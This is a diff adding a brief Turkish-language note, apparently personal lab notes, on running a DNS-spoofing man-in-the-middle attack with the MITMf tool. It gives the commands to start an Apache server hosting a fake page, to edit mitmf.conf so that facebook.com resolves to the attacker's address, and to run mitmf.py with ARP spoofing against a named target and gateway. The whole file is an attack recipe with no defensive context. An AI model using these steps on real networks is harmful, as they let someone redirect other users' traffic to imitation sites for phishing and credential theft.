@@ -1,0 +1,9 @@
+bu yontem mitmf ile calistirilmalidir.
+
+1) service apache2 start: (bu komut ile sunucu acildi bile apache2 sunucusu)(olusturulan sunucu var klasorunde www html klasorundeki index.html gibi kaydedilir.)(index.html dosyasini duzenleyip olusturulan web sitemizi duzenleyebiliriz.)
+
+2) computer/opt/mitmfmaster/config/mitmf.conf u texteditorle ac
+nameservers kismi altinda yonlendirmek istedigini olusturabilirsin mesela soyle:
+*.facebook.com=10.0.2.15(facebook.com a girenleri 10.0.2.15e yonlendir.)
+
+3) python mitmf.py -i eth0 --arp --spoof --gateway 10.0.2.1 --target 10.0.2.15 --dns ===> Bu komutla birlikte target hangi siteyi girerse bizim belirledigimiz siteye yonlenecektir
